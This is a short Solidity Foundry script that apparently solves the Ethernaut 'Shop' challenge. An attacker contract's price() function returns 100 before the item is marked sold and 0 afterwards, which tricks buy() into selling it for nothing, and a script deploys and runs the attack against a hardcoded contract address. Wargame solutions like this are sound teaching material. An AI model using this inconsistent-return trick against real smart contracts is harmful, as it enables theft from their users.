// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";

contract Ex {
    Shop public shop_ = Shop(0xF2e18d8912005C118E1776537Fa4da1eA756B2c7);

    function price() external view returns (uint256) {
        if (shop_.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function ex() public {
        shop_.buy();
    }
}

contract ShopSol is Script {
    Shop public shop_ = Shop(0xF2e18d8912005C118E1776537Fa4da1eA756B2c7);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();
        ex.ex();
        console.log("item price: ", shop_.price());
        console.log("isSold: ", shop_.isSold());

        vm.stopBroadcast();
    }
}